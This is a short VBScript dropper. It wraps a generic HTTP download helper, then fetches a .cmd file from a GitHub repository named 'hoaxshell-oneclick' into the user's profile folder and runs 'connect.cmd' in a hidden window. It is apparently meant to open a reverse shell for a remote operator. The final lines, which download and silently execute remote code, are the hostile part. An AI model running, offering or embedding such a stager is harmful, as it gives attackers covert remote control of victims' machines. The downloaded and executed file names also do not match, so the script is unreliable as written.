Set oShell = CreateObject("WScript.Shell")
userprofile = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
Dim WinScriptHost

Sub HTTPDownload( myURL, myPath )
    ' This Sub downloads the FILE specified in myURL to the path specified in myPath.
    '
    ' myURL must always end with a file name
    ' myPath may be a directory or a file name; in either case the directory must exist
    '
    ' Written by Rob van der Woude
    ' http://www.robvanderwoude.com
    '
    ' Based on a script found on the Thai Visa forum
    ' http://www.thaivisa.com/forum/index.php?showtopic=21832
    
        ' Standard housekeeping
        Dim i, objFile, objFSO, objHTTP, strFile, strMsg
        Const ForReading = 1, ForWriting = 2, ForAppending = 8
    
        ' Create a File System Object
        Set objFSO = CreateObject( "Scripting.FileSystemObject" )
    
        ' Check if the specified target file or folder exists,
        ' and build the fully qualified path of the target file
        If objFSO.FolderExists( myPath ) Then
            strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
        ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
            strFile = myPath
        Else
            WScript.Echo "ERROR: Target folder not found."
            Exit Sub
        End If
    
        ' Create or open the target file
        Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
    
        ' Create an HTTP object
        Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
    
        ' Download the specified URL
        objHTTP.Open "GET", myURL, False
        objHTTP.Send
    
        ' Write the downloaded byte stream to the target file
        For i = 1 To LenB( objHTTP.ResponseBody )
            objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
        Next
    
        ' Close the target file
        objFile.Close( )
End Sub

HTTPDownload "https://raw.githubusercontent.com/Aircraft192/hoaxshell-oneclick/main/download_test.cmd", userprofile
WScript.Sleep 500
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run Chr(34) & userprofile & "connect.cmd" & Chr(34), 0
Set WinScriptHost = Nothing